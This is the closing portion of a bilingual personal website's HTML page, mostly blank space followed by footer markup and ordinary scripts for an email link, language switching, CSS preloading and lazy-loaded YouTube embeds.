          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
        </div>
      </section>
      
    </div>
   </div> 
  </div>


<footer class="l-footer">
<span class="copyleft">&copy;</span>
<span lang="en">&nbsp; Antonios Tsolis &nbsp; </span>
<span lang="el">&nbsp; Αντώνιος Τσώλης &nbsp; </span>
<script>
  function email(starting,server,firstname,lastname,subject,body,closing) {
    document.write(starting); document.write(lastname); document.write("." + firstname); document.write("@" + server);if (Boolean(subject)) { document.write("?subject=" + subject + "&body=" + body); }
    document.write(closing); }
  email("<a class='mymail' aria-label='Send me an email' href='mailto:", "gmail.com", "antonios", "tsolis", "", "","' target='_blank'><i class='fa fa-envelope-o' aria-hidden='true'></i></a>");
</script>
</footer>
<script async src="https://alamot.github.io/js/jq-btsp-lunr.min.js" onload="init()"></script>
<script>
short_months = {
  "en": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
  "el": ["Ιαν", "Φεβ", "Μαρ", "Απρ", "Μαϊ", "Ιουν", "Ιουλ", "Αυγ", "Σεπ", "Οκτ", "Νοε", "Δεκ"]
}
function init () {
$(document).ready(function(){
  $("#lang-selector>ul>li>a").click(function(){
    var langid = this.id;
    var selText = this.text;
    document.getElementById('mainbody').setAttribute('class', langid);
    document.getElementById('mainbody').setAttribute('lang', langid);
    localStorage.setItem('language', langid);
    $("#lang-selector>a").html(selText+' <i class="fa fa-caret-down" aria-hidden="true"></i>');
  });

  $("#TableOfContents a, #content-selector a").on('click', function(e) {
    var hash = this.hash;
    if (hash) {
      e.preventDefault();
      $('html, body').animate({scrollTop: $(hash).offset().top}, 1300, function(){
        window.location.hash = hash;
      });
    }  
  });

  
});}
</script>
<script>
(function(a){var b=function(b,h,n){function d(a){if(f.body)return a();setTimeout(function(){d(a)})}function k(){c.addEventListener&&c.removeEventListener("load",k);c.media=n||"all"}var f=a.document,c=f.createElement("link"),g;if(h)g=h;else{var e=(f.body||f.getElementsByTagName("head")[0]).childNodes;g=e[e.length-1]}var m=f.styleSheets;c.rel="stylesheet";c.href=b;c.media="only x";d(function(){g.parentNode.insertBefore(c,h?g:g.nextSibling)});var l=function(a){for(var b=c.href,d=m.length;d--;)if(m[d].href===
b)return a();setTimeout(function(){l(a)})};c.addEventListener&&c.addEventListener("load",k);c.onloadcssdefined=l;l(k);return c};"undefined"!==typeof exports?exports.loadCSS=b:a.loadCSS=b})("undefined"!==typeof global?global:this);
(function(a){if(a.loadCSS){var b=loadCSS.relpreload={};b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(h){return!1}};b.poly=function(){for(var b=a.document.getElementsByTagName("link"),e=0;e<b.length;e++){var d=b[e];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d),d.rel=null)}};if(!b.support()){b.poly();var e=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){a.clearInterval(e)});a.attachEvent&&
a.attachEvent("onload",function(){a.clearInterval(e)})}}})(this);
</script>
<script>
function labnolIframe(div) {
  var iframe = document.createElement('iframe');
  iframe.setAttribute('src', 'https://www.youtube.com/embed/' + div.dataset.id + '?autoplay=1');
  iframe.setAttribute('frameborder', '0');
  iframe.setAttribute('allowfullscreen', '1');
  iframe.setAttribute('allow', 'accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture');
  div.parentNode.replaceChild(iframe, div);
}

function initYouTubeVideos() {
  var playerElements = document.querySelectorAll('.youtube-player');
  for (var n = 0; n < playerElements.length; n++) {
    var videoId = playerElements[n].dataset.id;
    var div = document.createElement('div');
    div.setAttribute('data-id', videoId);
    var thumbNode = document.createElement('img');
    thumbNode.src = '//i.ytimg.com/vi/ID/hqdefault.jpg'.replace('ID', videoId);
    div.appendChild(thumbNode);
    var playButton = document.createElement('div');
    playButton.setAttribute('class', 'play');
    div.appendChild(playButton);
    div.onclick = function () {
      labnolIframe(this);
    };
    playerElements[n].appendChild(div);
  }
}

document.addEventListener('DOMContentLoaded', initYouTubeVideos);
</script>
</body>
</html>

